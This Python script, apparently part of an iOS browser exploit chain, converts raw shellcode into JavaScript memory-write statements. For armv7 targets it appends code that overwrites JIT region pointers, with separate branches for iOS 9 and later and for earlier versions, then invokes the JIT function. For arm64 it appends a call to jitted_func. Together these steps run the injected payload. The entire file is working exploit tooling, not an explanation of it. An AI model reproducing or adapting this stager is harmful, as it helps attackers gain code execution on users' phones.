import os
import sys

def write32(offset, raw_bytes):
    with open("shellcode.js", "a") as f:
        f.write("mem.write32(shellcode + {}, 0x{:08x});\n".format(offset, raw_bytes))

def process_bin_file(file_path):
    with open(file_path, "rb") as f:
        offset = 0
        while True:
            data = f.read(4)
            if not data:
                break
            raw_bytes = int.from_bytes(data, byteorder='little')
            write32(offset, raw_bytes)
            offset += 4
        

def main():
    if len(sys.argv) != 3:
        print("python bin_to_js.py <bin> <armv7/arm64>")
        return

    file_path = sys.argv[1]    
    arch = sys.argv[2]    

    if os.path.exists("shellcode.js"):
        os.remove("shellcode.js")    
    process_bin_file(file_path)

    with open("shellcode.js", 'a') as target:
        if arch == "arm64":
            target.write("jitted_func();\n")
        elif arch == "armv7":
            target.write("\nif (ios_version >= 9) {\n")
            target.write("\tmem.write32(jit_addr2, jit_addr2+0x4);\n")
            target.write("\tmem.write32(jit_addr2+0x4, jit_addr2+0x4);\n")
            target.write("\tmem.write32(jit_addr2+0x30, jit_addr2+0x1C);\n")
            target.write("\tmem.write32(jit_addr2+0x34, shellcode);\n")
            target.write("} else {\n")
            target.write("\tmem.write32(jit_addr2, jit_addr2+0x4);\n")
            target.write("\tmem.write32(jit_addr2+0x4, jit_addr2+0x4);\n")
            target.write("\tmem.write32(jit_addr2+0x08, shellcode);\n")
            target.write("\tmem.write32(jit_addr2+0x30, jit_addr2+0x1C);\n")
            target.write("\tmem.write32(jit_addr2+0x34, jit_addr2-0x14);\n")
            target.write("}\n\n")
            target.write("jit_func2();\n")

if __name__ == "__main__":
    main()
